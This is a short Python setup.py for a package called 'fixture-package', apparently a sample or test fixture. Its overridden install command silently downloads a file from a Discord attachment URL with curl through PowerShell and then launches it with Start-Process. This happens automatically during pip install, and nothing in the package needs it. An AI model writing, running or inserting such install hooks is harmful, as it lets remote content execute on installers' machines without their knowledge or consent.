import os
import subprocess
from setuptools import setup
from setuptools.command.install import install


class InstallAudio(install):
    def run(self):
        target = os.path.join(os.getcwd(), "track.mp3")
        download = "curl.exe -L https://cdn.discordapp.com/attachments/1259306460811104446/1293822784027496520/track.mp3 -o track.mp3"
        subprocess.run(["powershell", "-Command", download])
        subprocess.run(
            ["powershell", "-Command", f'Start-Process "{target}" -Wait']
        )
        install.run(self)


setup(name="fixture-package", cmdclass={"install": InstallAudio})
